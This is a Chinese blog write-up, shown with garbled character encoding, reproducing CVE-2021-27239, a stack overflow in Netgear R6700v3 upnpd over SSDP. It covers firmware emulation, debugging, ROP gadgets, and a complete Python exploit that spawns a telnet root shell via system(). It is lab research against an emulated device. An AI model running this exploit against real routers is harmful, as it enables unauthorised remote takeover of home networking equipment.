<!DOCTYPE html><html lang="zh-CN"><head><title>IoTï¼šCVE-2021-27239å¤ç°è®°å½•</title><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="stylesheet" href="/css/highlight/xcode.min.css"><link rel="stylesheet" href="/css/bootstrap/bootstrap-tooltips.css"><link rel="stylesheet" href="/css/post.css"><script src="/js/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body><script>if (/mobile/i.test(navigator.userAgent) || /android/i.test(navigator.userAgent)) {
  document.body.classList.add('mobile')
}</script><div><div class="inner"><h1>IoTï¼šCVE-2021-27239å¤ç°è®°å½•</h1><div class="time">2023-04-09</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00%EF%BC%9A%E5%89%8D%E8%A8%80"><span class="toc-text">0x00ï¼šå‰è¨€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%EF%BC%9A%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-text">0x01ï¼šç›¸å…³çŸ¥è¯†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%EF%BC%9A%E6%BC%8F%E6%B4%9E%E6%89%80%E5%9C%A8"><span class="toc-text">0x02ï¼šæ¼æ´æ‰€åœ¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%EF%BC%9A%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F"><span class="toc-text">0x03ï¼šå›ºä»¶æ¨¡æ‹Ÿ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%EF%BC%9A%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="toc-text">0x04ï¼šè¿œç¨‹è°ƒè¯•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">0x05ï¼šæ¼æ´åˆ©ç”¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06%EF%BC%9A%E6%80%BB%E7%BB%93%E4%B8%8E%E5%8F%82%E8%80%83"><span class="toc-text">0x06ï¼šæ€»ç»“ä¸å‚è€ƒ</span></a></li></ol><h2 id="0x00ï¼šå‰è¨€"><a href="#0x00ï¼šå‰è¨€" class="headerlink" title="0x00ï¼šå‰è¨€"></a>0x00ï¼šå‰è¨€</h2><p>æ¼æ´CVE-2021-27239è¢«æŠ«éœ²äºéƒ¨åˆ†Netgearè·¯ç”±å™¨ä¸­ï¼Œæ˜¯UPnPæœåŠ¡æ‰€ç”¨çš„SSDPåè®®ä¸Šçš„ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ã€‚è¯¥æ¼æ´çš„åˆ©ç”¨æ€è·¯ä¸ä¸Šä¸€æ¬¡CVE-2021-34991æ¼æ´ç›¸è¿‘ï¼Œæ‰€ä»¥æœ¬æ–‡ä¼šç•¥å†™åˆ©ç”¨æ‰‹æ³•ï¼Œè¯¦å†™å›ºä»¶æ¨¡æ‹Ÿã€ç¨‹åºè°ƒè¯•ç­‰è¿‡ç¨‹ã€‚</p>
<br>

<h2 id="0x01ï¼šç›¸å…³çŸ¥è¯†"><a href="#0x01ï¼šç›¸å…³çŸ¥è¯†" class="headerlink" title="0x01ï¼šç›¸å…³çŸ¥è¯†"></a>0x01ï¼šç›¸å…³çŸ¥è¯†</h2><p>UPnPåè®®ï¼Œ<em>Universal Plug and Play</em>ï¼Œå¹¿ä¹‰çš„å³æ’å³ç”¨ã€‚UPnPçš„ç›®çš„æ˜¯ï¼šå½“ä»»ä½•è®¾å¤‡ä¸€æ—¦è¿æ¥ä¸Šç½‘ç»œï¼Œç½‘ç»œä¸Šçš„å…¶å®ƒè®¾å¤‡èƒ½å¤Ÿé©¬ä¸ŠçŸ¥é“æœ‰æ–°è®¾å¤‡åŠ å…¥ï¼Œç„¶åè¿™äº›è®¾å¤‡èƒ½å¤Ÿäº’ç›¸å®£ä¼ å’Œå‘ç°å½¼æ­¤çš„èƒ½åŠ›å’ŒæœåŠ¡ï¼Œä»¥ä¾¿èƒ½å¤Ÿä½¿ç”¨å’Œæ§åˆ¶å½¼æ­¤ã€‚UPnPé¿å…äº†äººå·¥é…ç½®çš„çç¢å’Œæ“ä½œçš„ç¼“æ…¢ã€‚</p>
<p>SSDPåè®®ï¼Œ<em>Simple Service Discovery Protocol</em>ï¼Œç®€å•æœåŠ¡å‘ç°åè®®ï¼Œç”¨äºå®£ä¼ å’Œå‘ç°è®¾å¤‡æä¾›çš„æœåŠ¡å’Œè®¾å¤‡çš„ä¸€äº›ä¿¡æ¯ã€‚æ­¤åè®®é‡‡ç”¨åŸºäºé€šçŸ¥å’Œå‘ç°è·¯ç”±çš„å¤šæ’­å‘ç°æ–¹å¼å®ç°ï¼Œåè®®å®¢æˆ·ç«¯åœ¨ä¿ç•™çš„å¤šæ’­åœ°å€ï¼š239.255.255.250:1900 (IPv4) å‘ç°æœåŠ¡ï¼Œ(IPv6 ä¸ºFF0x::C)ã€‚åŒæ—¶æ¯ä¸ªè®¾å¤‡æœåŠ¡ä¹Ÿåœ¨æ­¤åœ°å€ä¸Šç›‘å¬æœåŠ¡å‘ç°è¯·æ±‚ã€‚å¦‚æœæœåŠ¡ç›‘å¬åˆ°çš„å‘ç°è¯·æ±‚ä¸æ­¤æœåŠ¡ç›¸åŒ¹é…ï¼Œæ­¤æœåŠ¡ä¼šä½¿ç”¨å•æ’­æ–¹å¼å“åº”ã€‚</p>
<p>è¯·æ±‚æŠ¥æ–‡ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">M-SEARCH * HTTP&#x2F;1.1
HOST:239.255.255.250:1900
MAN:&quot;ssdp:discover&quot;
MX:5
ST:ssdp:all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å“åº”æŠ¥æ–‡ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 200 OK
ST: upnp:rootdevice
LOCATION: http:&#x2F;&#x2F;192.168.6.2:5000&#x2F;Public_UPNP_gatedesc.xml
SERVER: Linux&#x2F;2.6.12, UPnP&#x2F;1.0, NETGEAR-UPNP&#x2F;1.0
EXT:
CACHE-CONTROL: max-age&#x3D;3600
USN: uuid:6cbbc296-de22-bde2-3d68-5576da5933d1::upnp:rootdevice<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<br>

<h2 id="0x02ï¼šæ¼æ´æ‰€åœ¨"><a href="#0x02ï¼šæ¼æ´æ‰€åœ¨" class="headerlink" title="0x02ï¼šæ¼æ´æ‰€åœ¨"></a>0x02ï¼šæ¼æ´æ‰€åœ¨</h2><p>æœ¬æ¬¡å¤ç°æ‰€ç”¨çš„å›ºä»¶ç‰ˆæœ¬ä¸ºR6700v3 1.0.4.102ï¼Œå¯ç‚¹å‡»<a target="_blank" rel="noopener" href="https://kb.netgear.com/000062417/R6700v3-Firmware-Version-1-0-4-102]">è¿™é‡Œ</a>ä¸‹è½½ã€‚ä¸‹è½½åä½¿ç”¨<code>binwalk -Me</code>æå–å‡ºå›ºä»¶æ–‡ä»¶ç³»ç»Ÿã€‚æˆ‘ä»¬å·²çŸ¥æ¼æ´å­˜åœ¨äºupnpæœåŠ¡ä¸­ï¼Œæ‰€ä»¥é¦–å…ˆå¾—æ‰¾å‡ºå¯¹åº”çš„ç¨‹åºã€‚å¯ä»¥é€šè¿‡ç›¸å…³çš„å‘½ä»¤æ¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿåœ°å¯»æ‰¾ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># findå‘½ä»¤
find . -name upnpd
# å¦‚æœä¸å¤ªç¡®å®šæ–‡ä»¶åå­—ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦
find . -name *upnp*

# grepå‘½ä»¤
grep -r upnp  #ä¸ä»…æ˜¯æ–‡ä»¶åï¼Œæ–‡ä»¶ä¸­å«æœ‰è¯¥å­—ç¬¦éƒ½ä¼šè¢«æŸ¥æ‰¾å‡ºæ¥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é€šè¿‡å‘½ä»¤ï¼Œå¯ä»¥æ‰¾åˆ°upnpæœåŠ¡ç¨‹åºæ˜¯/usr/sbin/upnpdã€‚</p>
<p>IDAæ‰“å¼€upnpdç¨‹åºï¼Œé€šè¿‡å­—ç¬¦ä¸²æŸ¥æ‰¾ï¼Œå¯å¾ˆå¿«å®šä½åˆ°æ¼æ´æ‰€åœ¨å¤„ï¼š</p>
<p><img src="/images/CVE-2021-27239%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/image-20230405210752357.png" alt="image-20230405210752357"></p>
<p>å¯ä»¥çœ‹å‡ºï¼Œstrncpyæ‹·è´çš„é•¿åº¦æ˜¯ç­‰äºMXå­—æ®µçš„é•¿åº¦ï¼ŒåŒæ—¶v6æ˜¯ä½äºæ ˆä¸Šçš„ï¼Œå› æ­¤å¯ä»¥è¿›è¡Œæ ˆæº¢å‡ºåˆ©ç”¨ã€‚</p>
<br>

<h2 id="0x03ï¼šå›ºä»¶æ¨¡æ‹Ÿ"><a href="#0x03ï¼šå›ºä»¶æ¨¡æ‹Ÿ" class="headerlink" title="0x03ï¼šå›ºä»¶æ¨¡æ‹Ÿ"></a>0x03ï¼šå›ºä»¶æ¨¡æ‹Ÿ</h2><div style="font-size: 21px;"><b>FirmAEï¼š</b></div>

<p>å›ºä»¶æ¨¡æ‹Ÿæ˜¯æˆåŠŸäº†ï¼Œä½†å‘é€æ•°æ®åŒ…æ—¶ï¼Œä¼¼ä¹æ²¡å‘é€åˆ°ã€‚åŸå› å¾…å¯»â€¦â€¦ğŸ˜¶</p>
<br>

<div style="font-size: 21px;"><b>qemuç³»ç»Ÿçº§æ¨¡æ‹Ÿï¼š</b></div>

<p>é€šè¿‡fileå‘½ä»¤å¯çŸ¥é“æŒ‡ä»¤æ¶æ„ä¸º32ä½ARM å°ç«¯åºï¼Œå›ºä»¶çš„ç³»ç»Ÿçº§æ¨¡æ‹Ÿéœ€è¦å†…æ ¸é•œåƒæ–‡ä»¶ã€æ–‡ä»¶ç³»ç»Ÿå’Œå¯åŠ¨æ–‡ä»¶ï¼Œåœ¨æ­¤<a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/">ç½‘ç«™</a>å¯è¿›è¡Œä¸‹è½½ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget https:&#x2F;&#x2F;people.debian.org&#x2F;~aurel32&#x2F;qemu&#x2F;armhf&#x2F;debian_wheezy_armhf_standard.qcow2
wget https:&#x2F;&#x2F;people.debian.org&#x2F;~aurel32&#x2F;qemu&#x2F;armhf&#x2F;vmlinuz-3.2.0-4-vexpress
wget https:&#x2F;&#x2F;people.debian.org&#x2F;~aurel32&#x2F;qemu&#x2F;armhf&#x2F;initrd.img-3.2.0-4-vexpress<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<br>

<p>åœ¨å®¿ä¸»æœºåˆ›å»ºä¸ªè™šæ‹Ÿç½‘å¡ï¼Œç”¨äºä¸è™šæ‹Ÿæœºäº¤äº’ã€‚æ¥ç€å°±æ˜¯ä½¿ç”¨qemu-system-armå¼€å§‹æ¨¡æ‹Ÿã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">#! &#x2F;bin&#x2F;bash
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.6.1&#x2F;24
qemu-system-arm -M vexpress-a9 \
	-kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress \
	-drive if&#x3D;sd,file&#x3D;debian_wheezy_armhf_standard.qcow2 \
	-append &quot;root&#x3D;&#x2F;dev&#x2F;mmcblk0p2&quot; \
	-net nic -net tap,ifname&#x3D;tap0,script&#x3D;no,downscript&#x3D;no -nographic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<br>

<p>è™šæ‹ŸæœºæˆåŠŸæ¨¡æ‹Ÿä¹‹åï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># é…ç½®è™šæ‹Ÿç½‘å¡ï¼Œç”¨äºå®¿ä¸»æœºäº¤äº’
ifconfig eth0 192.168.6.2&#x2F;24

# ä»å®¿ä¸»æœºä¼ è¾“æ–‡ä»¶ç³»ç»Ÿåˆ°è™šæ‹Ÿæœº
# 1.åœ¨å®¿ä¸»æœºæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œä¼šä»¥å½“å‰ç›®å½•ä¸ºæ ¹ç›®å½•ï¼Œåœ¨8888ç«¯å£å¼€å¯ä¼ è¾“æœåŠ¡
python2 -m SimpleHTTPServer 8888   # python2
python3 -m http.server 8888        # python3
# 2.åœ¨è™šæ‹Ÿæœºä¸­ä½¿ç”¨wgetä¸‹è½½
wget 192.168.6.1:8888&#x2F;[file]

# æŒ‚è½½
mount -t proc &#x2F;proc .&#x2F;squashfs-root&#x2F;proc
mount -o bind &#x2F;dev .&#x2F;squashfs-root&#x2F;dev

chroot .&#x2F;squashfs-root&#x2F; sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<br>

<p>å¯åŠ¨upnpæœåŠ¡ï¼š<code>/usr/sbin/upnpd</code></p>
<p>æŠ¥é”™ï¼š<code>/dev/nvram: No such file or directory</code>è¿™æ˜¯å›ºä»¶æ¨¡æ‹Ÿä¸­æ¯”è¾ƒå¸¸è§çš„ä¸€ä¸ªé—®é¢˜ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥æŠŠç›¸å…³çš„ä»£ç patchæ‰ï¼Œå…·ä½“æ“ä½œæ˜¯ï¼šè‡ªå®šä¹‰ç›¸åº”çš„å‡½æ•°ï¼Œç„¶åé€šè¿‡LD_PRELOADç¯å¢ƒå˜é‡ä¼˜å…ˆåŠ è½½æˆ‘ä»¬ç¼–å†™çš„åº“ã€‚åˆæ­¤ä¹‹å¤–ï¼Œè¿˜å¯èƒ½ä¼šæŠ¥æ‰¾ä¸åˆ°dlsymç¬¦å·çš„é”™è¯¯ï¼Œè¿™æ˜¯å› ä¸ºæ²¡æœ‰åŠ è½½åˆ°libdl.so.0åº“ã€‚</p>
<p>è¯¦ç»†å†…å®¹å¯å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://paper.seebug.org/1311/">https://paper.seebug.org/1311/</a></p>
<p>æœ€åï¼š<code>LD_PRELOAD=&quot;/nvram.so /libdl.so.0&quot; /usr/sbin/upnpd</code></p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨å®¿ä¸»æœº<code>nmap 192.168.6.2</code>æ£€æŸ¥ä¸€ä¸‹upnpæœåŠ¡æ˜¯å¦æˆåŠŸå¯åŠ¨ã€‚</p>
<br>

<h2 id="0x04ï¼šè¿œç¨‹è°ƒè¯•"><a href="#0x04ï¼šè¿œç¨‹è°ƒè¯•" class="headerlink" title="0x04ï¼šè¿œç¨‹è°ƒè¯•"></a>0x04ï¼šè¿œç¨‹è°ƒè¯•</h2><p>æˆ‘ä»¬æ‰€çŸ¥é“ï¼ŒåµŒå…¥å¼è®¾å¤‡çš„ç£ç›˜ç©ºé—´æ˜¯å¾ˆå°çš„ï¼Œä¸è¶³ä»¥å»æ·»åŠ å®Œæ•´çš„å·¥å…·ï¼Œå…¶ä¸­ä¹‹ä¸€å°±æ˜¯gdbã€‚äº†è§£åˆ°ï¼Œgdbserveræ˜¯ä¸€ä¸ªç¨‹åºï¼Œå®ƒå¯ä»¥ä½¿gdbå’Œè¢«è°ƒè¯•ç¨‹åºåˆ†åˆ«è¿è¡Œåœ¨ä¸åŒæœºå™¨ä¸Šã€‚æƒ³è¦å¯¹upnpæœåŠ¡ç¨‹åºè¿›è¡Œè°ƒè¯•ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªgdbserverç¨‹åºåˆ°è™šæ‹Ÿæœºä¸­ï¼Œåœ¨è™šæ‹Ÿä¸­å¼€å¯ä¸€ä¸ªè°ƒè¯•ç«¯å£ï¼Œè®©å®¿ä¸»æœºèƒ½å¤Ÿè¿æ¥è°ƒè¯•ã€‚</p>
<p>ç‚¹å‡»<a target="_blank" rel="noopener" href="https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/gdbserver">è¿™é‡Œ</a>ä¸‹è½½gdbserverç¨‹åº</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ps | grep upnpd   # æŸ¥çœ‹upnpdæœåŠ¡çš„è¿›ç¨‹å·
.&#x2F;gdbserver-7.7.1-armhf-eabi5-v1-sysv --attach 0.0.0.0:12345 [pid]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç”±äºæ˜¯armæ¶æ„ï¼Œæ‰€ä»¥å®¿ä¸»æœºå¾—ç”¨gdb-multiarchè¿›è¡Œè¿æ¥ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># ç›¸å…³çš„gdbå‘½ä»¤
set architecture arm
target remote 192.168.6.2:12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬å¯ä»¥åœ¨gdbä¸­è®¾ç½®å¥½æ–­ç‚¹ï¼Œç„¶åæ‰§è¡Œåˆ©ç”¨è„šæœ¬ï¼Œè™šæ‹Ÿæœºä¸­çš„ç¨‹åºä¼šå¡åœ¨æ–­ç‚¹å¤„ï¼Œç­‰å¾…ç€æˆ‘ä»¬çš„è°ƒè¯•ã€‚</p>
<br>

<h2 id="0x05ï¼šæ¼æ´åˆ©ç”¨"><a href="#0x05ï¼šæ¼æ´åˆ©ç”¨" class="headerlink" title="0x05ï¼šæ¼æ´åˆ©ç”¨"></a>0x05ï¼šæ¼æ´åˆ©ç”¨</h2><p>æ¼æ´åˆ©ç”¨æ€è·¯å’Œä¸Šæ¬¡<a target="_blank" rel="noopener" href="https://toleleyjl.github.io/2023/02/16/CVE-2021-34991%E5%A4%8D%E7%8E%B0/">CVE-2021-34991</a>ç›¸å·®æ— å‡ ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™æ¬¡å¯¹ä¸¤å¤„å‘åŒ…ï¼Œä¸€æ¬¡æ˜¯å…ˆå¯¹5000ç«¯å£å‘é€å‘½ä»¤å­˜å…¥ï¼Œå¦å¤–ä¸€æ¬¡æ˜¯å¯¹1900ç«¯å£å‘åŒ…åˆ©ç”¨ã€‚åˆ©ç”¨æ‰‹æ³•è¿˜æ˜¯ä½¿ç”¨æ ˆæº¢å‡ºè¿›è¡ŒROPï¼Œåˆ©ç”¨è¿‡ç¨‹ï¼šæœ‰äº†å¤§æ¦‚çš„æƒ³æ³•ï¼Œç„¶åå»æ‰¾gadgetï¼Œç¼–å†™expè¯•è¯•ï¼Œç„¶åå°±æ˜¯æ‰¾gadget-&gt;æ…¢æ…¢è°ƒæ•´ï¼Œä¸€ä¸ªåå¤çš„è¿‡ç¨‹ã€‚</p>
<p>æˆ‘è¿™é‡Œç”¨åˆ°çš„gadgetæ˜¯è¿™ä¸¤æ®µï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">.text:00013908 02 DB 8D E2                   ADD             SP, SP, #0x800
.text:0001390C 70 80 BD E8                   POP             &#123;R4-R6,PC&#125;

.text:00017C78 04 00 A0 E1                   MOV             R0, R4        ; command
.text:00017C7C 78 CC FF EB                   BL              system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‰¾gadgetç”¨çš„å·¥å…·æ˜¯ROPgadgetï¼Œå¥‡æ€ªçš„æ˜¯<code>--onlyå‚æ•°</code>å¥½åƒæ²¡èµ·åˆ°æŒ‘é€‰ä½œç”¨ã€‚è¿™æ ·å­çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆ<code>ROPgadget --binary ./upnpd</code>ï¼Œçœ‹çœ‹æŒ‡ä»¤çš„å¤§æ¦‚æ ¼å¼ï¼Œç„¶åå†åœ¨åé¢ä½¿ç”¨grepæ¥ä¸€æ¬¡æˆ–è€…å¤šæ¬¡è¿›è¡ŒæŒ‘é€‰ã€‚ä¾‹å¦‚ï¼š<code>ROPgadget --binary ./upnpd | grep &quot;add sp, sp&quot; | grep &quot;pop&quot;</code>ã€‚</p>
<p>è‡³äºè°ƒç”¨systemçš„gadgetï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨IDAæ‰¾åˆ°å¯¹systemçš„å…³è”å¼•ç”¨ï¼Œä¾æ¬¡æŸ¥çœ‹ã€‚<img src="/images/CVE-2021-27239%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/image-20230409184735245.png" alt="image-20230409184735245"></p>
<p>EXPï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">import socket
import pwn

ssdp_port &#x3D; 1900
upnp_port &#x3D; 5000
ip &#x3D; &quot;192.168.6.2&quot;
command &#x3D; &quot;&#x2F;bin&#x2F;utelnetd -p3333 -l&#x2F;bin&#x2F;sh -d&quot;

def s2b(s):
	return bytes([ord(x) for x in s])

def mySend(ip, port, payload):
	sock&#x3D;socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	sock.connect((ip, port))
	sock.send(payload)
	pwn.sleep(1)
	sock.close()
	
def mySend_http(ip, port, payload):
	sock&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((ip, port))
	sock.send(payload)
	pwn.sleep(1)
	sock.close()
	
def set_command():
	# å°†å‘½ä»¤å†™åˆ°å…¨å±€å˜é‡ä¸­
	payload &#x3D;  b&#39;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; &#39;
	payload +&#x3D; b&#39;&lt;SOAP-ENV:Envelope&gt; &#39;
	payload +&#x3D; b&#39;Body&gt;:&#39;
	payload +&#x3D; s2b(command.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;))
#	payload +&#x3D; b&#39;ls&#39;
#	payload +&#x3D; b&#39;Body&gt;&#39;
	payload +&#x3D; b&quot; &lt;&#x2F;SOAP-ENV:Body&gt; &quot;
	payload +&#x3D; b&quot;&lt;&#x2F;SOAP-ENV:Envelope&gt;&quot;

	request  &#x3D; b&#39;POST &#x2F;Public_UPNP_C5 HTTP&#x2F;1.1\r\n&#39;
	request +&#x3D; s2b(&#39;Host: http:&#x2F;&#x2F;&#123;&#125;:&#123;&#125;\r\n&#39;.format(ip, upnp_port))
	request +&#x3D; b&#39;SOAPAction\r\n&#39;
	request +&#x3D; s2b(&#39;Content-Length: &#123;&#125;\r\n&#39;.format(len(payload)))
	request +&#x3D; b&#39;\r\n&#39;
	request +&#x3D; payload

	mySend_http(ip, upnp_port, request)

def Exploit():
	
	stack_add_gadget &#x3D; 0x13908  # ADD  SP, SP, #0x800;  POP  &#123;R4-R6,PC&#125;
	command_address  &#x3D; 0x65A58
	system_gadget    &#x3D; 0x17C78  # MOV R0, R4; BL system

	payload &#x3D; b&#39;M-SEARCH * HTTP&#x2F;1.1\r\n&#39;
	payload +&#x3D; b&#39;HOST: 239.255.255.250:1900\r\n&#39;
	payload +&#x3D; b&#39;MAN: &quot;ssdp:discover&quot;\r\n&#39;
	payload +&#x3D; b&#39;MX:4&#39; + b&#39;A&#39;*0x7f
	payload +&#x3D; b&#39;4444&#39;
	payload +&#x3D; b&#39;5555&#39;
	payload +&#x3D; b&#39;6666&#39;
	payload +&#x3D; pwn.p32(stack_add_gadget)[:3]
	payload +&#x3D; b&#39;\r\n\x00&#39;
	payload +&#x3D; b&#39;J&#39;*(0x800 - 0x778)
	payload +&#x3D; pwn.p32(command_address)
	payload +&#x3D; b&#39;K&#39;*4*2
	payload +&#x3D; pwn.p32(system_gadget)
	payload +&#x3D; b&#39;ST: ssdp:all\r\n&#39;
	print(&quot;len&#x3D;&quot;+str(len(payload)))
	print(payload)
	mySend(ip, ssdp_port, payload)
	
if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
	set_command()
	Exploit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<br>

<p>è¿™æ¬¡åˆ©ç”¨å› ä¸ºå¾—å‘ä¸¤å¤„å‘åŒ…ï¼Œæ‰€ä»¥EXPæœ‰ç‚¹å†—ä½™ã€‚å¹¸è¿çš„æ˜¯ï¼Œæˆ‘åœ¨pursueå¸ˆå‚…çš„<a target="_blank" rel="noopener" href="https://rmrfsad.github.io/2023/04/05/iot/CVE-2021-27239/">æ–‡ç« </a>ä¸­å­¦äº†ä¸€æ‹›ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨strncpyå‡½æ•°æ¥å­˜å…¥å‘½ä»¤ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">.text:0000BB44 04 00 A0 E1                   MOV             R0, R4        ; dest
.text:0000BB48 0D 10 A0 E1                   MOV             R1, SP        ; src
.text:0000BB4C F2 FE FF EB                   BL              strcpy
.text:0000BB4C
.text:0000BB50 01 DB 8D E2                   ADD             SP, SP, #0x400
.text:0000BB54 70 80 BD E8                   POP             &#123;R4-R6,PC&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™è¿˜æ˜¯æŒºä¸é”™çš„ï¼Œæ¯•ç«Ÿä¸ä¸€å®šæ‰€æœ‰çš„è·¯ç”±å™¨éƒ½èƒ½æ‰¾åˆ°å†™å…¥å‘½ä»¤çš„æœåŠ¡ã€‚</p>
<br>

<h2 id="0x06ï¼šæ€»ç»“ä¸å‚è€ƒ"><a href="#0x06ï¼šæ€»ç»“ä¸å‚è€ƒ" class="headerlink" title="0x06ï¼šæ€»ç»“ä¸å‚è€ƒ"></a>0x06ï¼šæ€»ç»“ä¸å‚è€ƒ</h2><p>è¿™æ¬¡å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œä¸è¿‡å¯¹äºå·¥å…·çš„ä½¿ç”¨è¿˜å¾—æ…¢æ…¢æ¶ˆåŒ–â€¦â€¦ğŸ˜´</p>
<div style="font-size: 21px;"><b>å‚è€ƒï¼š</b></div>

<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1311/">https://paper.seebug.org/1311/</a></p>
<p><a target="_blank" rel="noopener" href="https://rmrfsad.github.io/2023/04/05/iot/CVE-2021-27239/">https://rmrfsad.github.io/2023/04/05/iot/CVE-2021-27239/</a></p>
<p class="textAlignRight"><span>â†¶ </span><a href="/">è¿”å›é¦–é¡µ</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script async="" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script><script>MathJax = {
      tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
          fontCache: 'global'
      }
  };
</script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', '');</script></html>